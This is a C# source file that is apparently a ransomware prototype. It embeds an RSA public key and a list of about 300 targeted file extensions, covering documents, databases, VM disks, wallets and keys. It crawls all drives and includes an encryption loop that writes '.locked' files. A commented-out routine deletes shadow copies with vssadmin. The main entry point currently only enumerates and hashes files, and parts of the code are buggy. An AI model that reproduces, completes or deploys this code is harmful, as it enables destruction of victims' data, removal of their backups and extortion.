using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace MyApplic
{
    public class LockHelper
    {
        volatile Queue<string> _lock_files = new Queue<string>();
        List<string> validextension = new List<string>();
        const string PublicKey = @"<RSAKeyValue><Modulus>nwbjN1znmyL2KyOIrRy/PbWZpTi+oekJIoGNc6jHCl0JNZLFHNs70fyf7y44BH8L8MBkSm5sSwCZfLm5nAsDNOmuEV5Uab5DuWYSE4R2Z3NkKexJJ4bnmXEZYXPMzTbXIpyvU2y9YVrz1BjjRPeHsb6daVdrBgjs4+2b/ok9myM=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

        void Init()
        {
            validextension.AddRange(new[] { ".gif", ".apk", ".groups", ".hdd", ".hpp", ".log", ".m2ts", ".m4p", ".mkv", ".mpeg" });
            validextension.AddRange(new[] { ".epub", ".yuv", ".ndf", ".nvram", ".ogg", ".ost", ".pab", ".pdb", ".pif", ".png" });
            validextension.AddRange(new[] { ".qed", ".qcow", ".otp", ".s3db", ".qcow2", ".rvt", ".st7", ".stm", ".vbox", ".vdi" });
            validextension.AddRange(new[] { ".vhd", ".vhdx", ".vmdk", ".vmsd", ".psafe3", ".vmx", ".vmxf", ".3fr", ".3pr", ".ab4" });
            validextension.AddRange(new[] { ".accde", ".accdr", ".accdt", ".ach", ".acr", ".sd0", ".sxw", ".adb", ".advertisements" });
            validextension.AddRange(new[] { ".agdl", ".ait", ".apj", ".asm", ".awg", ".back", ".backup", ".sti", ".oil", ".backupdb" });
            validextension.AddRange(new[] { ".bay", ".bdb", ".bgt", ".bik", ".bpw", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".ycbcra" });
            validextension.AddRange(new[] { ".cdrw", ".ce1", ".ce2", ".cib", ".craw", ".crw", ".csh", ".csl", ".db_journal", ".dc2" });
            validextension.AddRange(new[] { ".pptm", ".dcs", ".ddoc", ".ddrw", ".der", ".des", ".dgc", ".djvu", ".dng", ".drf" });
            validextension.AddRange(new[] { ".dxg", ".eml", ".ppt", ".erbsql", ".erf", ".exf", ".ffd", ".fh", ".fhd", ".flp" });
            validextension.AddRange(new[] { ".gray", ".grey", ".gry", ".hbk", ".ibd", ".7z", ".ibz", ".iiq", ".incpas", ".jpe" });
            validextension.AddRange(new[] { ".kc2", ".kdbx", ".kdc", ".kpdx", ".ldf", ".lua", ".mdc", ".mdf", ".mef", ".config" });
            validextension.AddRange(new[] { ".mfw", ".mmw", ".mny", ".mrw", ".myd", ".ndd", ".nef", ".nk2", ".nop", ".nrw", ".ns2" });
            validextension.AddRange(new[] { ".ns3", ".ldf", ".ns4", ".nwb", ".nx2", ".nxl", ".nyf", ".odb", ".odf", ".odg", ".odm" });
            validextension.AddRange(new[] { ".orf", ".otg", ".oth", ".py", ".ots", ".ott", ".p12", ".p7b", ".p7c", ".pdd", ".pem" });
            validextension.AddRange(new[] { ".plus_muhd", ".plc", ".pot", ".pptx", ".py", ".qba", ".qbr", ".qbw", ".qbx", ".qby" });
            validextension.AddRange(new[] { ".raf", ".rat", ".raw", ".rdb", ".rwl", ".rwz", ".conf", ".sda", ".sdf", ".sqlite" });
            validextension.AddRange(new[] { ".sqlite3", ".sqlitedb", ".sr2", ".srf", ".srw", ".st5", ".st8", ".std", ".stx", ".sxd" });
            validextension.AddRange(new[] { ".sxg", ".sxi", ".sxm", ".tex", ".wallet", ".wb2", ".wpd", ".x11", ".x3f", ".xis", ".ARC" });
            validextension.AddRange(new[] { ".contact", ".dbx", ".doc", ".docx", ".jnt", ".jpg", ".msg", ".oab", ".ods", ".pdf", ".pps" });
            validextension.AddRange(new[] { ".ppsm", ".prf", ".pst", ".rar", ".rtf", ".txt", ".wab", ".xls", ".xlsx", ".xml", ".zip" });
            validextension.AddRange(new[] { ".1cd", ".3ds", ".3g2", ".7zip", ".accdb", ".aoi", ".asf", ".asp", ".aspx", ".asx", ".avi" });
            validextension.AddRange(new[] { ".bak", ".cer", ".cfg", ".class", ".cs ", ".css", ".csv", ".db", ".dds", ".dwg", ".dxf" });
            validextension.AddRange(new[] { ".flf", ".flv", ".html", ".idx", ".js", ".key", ".kwm", ".laccdb", ".lit", ".m3u", ".mbx" });
            validextension.AddRange(new[] { ".md", ".mdf", ".mid", ".mlb", ".mov", ".mp3", ".mp4", ".mpg", ".obj", ".odt", ".pages" });
            validextension.AddRange(new[] { ".php", ".psd", ".pwm", ".rm", ".safe", ".sav", ".save", ".sql", ".srt", ".swf", ".thm" });
            validextension.AddRange(new[] { ".vob", ".wav", ".wma", ".wmv", ".xlsb", ".3dm", ".aac", ".ai", ".arw", ".c", ".cdr" });
            validextension.AddRange(new[] { ".cls", ".cpi", ".cpp", ".cs", ".db3", ".docm", ".dot", ".dotm", ".dotx", ".drw", ".dxb" });
            validextension.AddRange(new[] { ".eps", ".fla", ".flac", ".fxg", ".java", ".m", ".m4v", ".max", ".mdb", ".pcd", ".pct" });
            validextension.AddRange(new[] { ".pl", ".potm", ".potx", ".ppam", ".ppsm", ".ppsx", ".pptm", ".ps", ".r3d", ".rw2", ".sldm" });
            validextension.AddRange(new[] { ".sldx", ".svg", ".tga", ".wps", ".xla", ".xlam", ".xlm", ".xlr", ".xlsm", ".xlt", ".xltm" });
            validextension.AddRange(new[] { ".xltx", ".xlw", ".act", ".adp", ".al", ".dip", ".docb", ".frm", ".gpg", ".jsp", ".lay" });
            validextension.AddRange(new[] { ".lay6", ".m4u", ".mml", ".myi", ".onetoc2", ".PAQ", ".ps1", ".sch", ".slk", ".snt", ".suo" });
            validextension.AddRange(new[] { ".tgz", ".tif", ".tiff", ".txt", ".uop", ".uot", ".vcd", ".wk1", ".wks", ".xlc" });
        }

        IEnumerable<DirectoryInfo> GetDirectories(DirectoryInfo parentDirectory)
        {
            DirectoryInfo[] childDirectories = null;
            try
            {
                childDirectories = parentDirectory.GetDirectories();
            }
            catch (Exception)
            {

            }
            yield return parentDirectory;
            if (childDirectories != null)
            {
                foreach (var childDirectory in childDirectories)
                {
                    var childDirectories2 = GetDirectories(childDirectory);
                    foreach (var childDirectory2 in childDirectories2)
                    {
                        yield return childDirectory2;
                    }
                }
            }
        }

        IEnumerable<FileInfo> GetFiles(DirectoryInfo parentDirectory,
                                             string searchPattern)
        {
            var directories = GetDirectories(parentDirectory);
            foreach (var directory in directories)
            {
                FileInfo[] files = null;
                try
                {
                    files = directory.GetFiles(searchPattern);
                }
                catch (Exception)
                {

                }
                if (files != null)
                {
                    foreach (var file in files)
                    {
                        yield return file;
                    }
                }
            }
        }

        void RunEncrypt()
        {
            var macname = Environment.MachineName;
            while (true)
            {
                if (_lock_files.Count > 0)
                {
                    var file = _lock_files.Dequeue();
                    var rsa = new RSACryptoServiceProvider(1024);
                    var fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read);
                    var fsout = new FileStream(file + $"_{DateTime.Now.ToString("yyyyMMdd")}_.locked", FileMode.Open, FileAccess.Read, FileShare.Read);
                    var bys = new byte[fs.Length];
                    fs.Read(bys, 0, bys.Length);
                    rsa.FromXmlString(PublicKey);
                    byte[] buf = rsa.Encrypt(bys, false);
                    fsout.Write(buf, 0, buf.Length);
                    fsout.Flush();
                    fsout.Close();
                }
            }
        }

        void SearchDisk()
        {
            var dris = Directory.GetLogicalDrives();
            for (int i = 0; i < dris.Length; i++)
            {
                SearchFiles(dris[i]);
            }
        }

        void SearchFiles(string path)
        {
            var files = GetFiles(new DirectoryInfo(path), ".");
            var files1 = files.GetEnumerator();
            while (files1.MoveNext())
            {
                var f = (FileInfo)files1.Current;
                if (validextension.IndexOf(f.Extension) >= 0)
                    _lock_files.Enqueue(f.FullName);
                Console.WriteLine($"{Path.GetFileName(f.FullName) } MD5 Hash:" + MD5Hash(f.FullName));
            }
        }

        string MD5Hash(string file)
        {
            var md5 = MD5.Create();
            // hash path
            string relativePath = file.Substring("\\".Length + 1);
            byte[] pathBytes = Encoding.UTF8.GetBytes(relativePath.ToLower());
            md5.TransformBlock(pathBytes, 0, pathBytes.Length, pathBytes, 0);

            using (var fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read))
            {
                var contentBytes = new byte[fs.Length];
                fs.Read(contentBytes, 0, contentBytes.Length);
                md5.TransformBlock(contentBytes, 0, contentBytes.Length, contentBytes, 0);
                md5.TransformFinalBlock(contentBytes, 0, contentBytes.Length);
            }
            return BitConverter.ToString(md5.Hash).Replace("-", "").ToLower();
        }

        void RemoveBackup()
        {
            //try
            //{
            //    ProcessStartInfo info = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet");
            //    info.RedirectStandardOutput = true;
            //    info.UseShellExecute = false;
            //    info.CreateNoWindow = true;
            //    info.WindowStyle = ProcessWindowStyle.Hidden;
            //    Process process = new Process();
            //    process.StartInfo = info;
            //    process.Start();
            //}
            //catch (Exception)
            //{

            //}
        }

        void DisplayLockinfo()
        {
            Console.WriteLine("run done...");
        }

        public void Main()
        {
            Init();
            //RunEncrypt();
            SearchDisk();
            //RemoveBackup();
            //DisplayLockinfo();
        }
    }
}
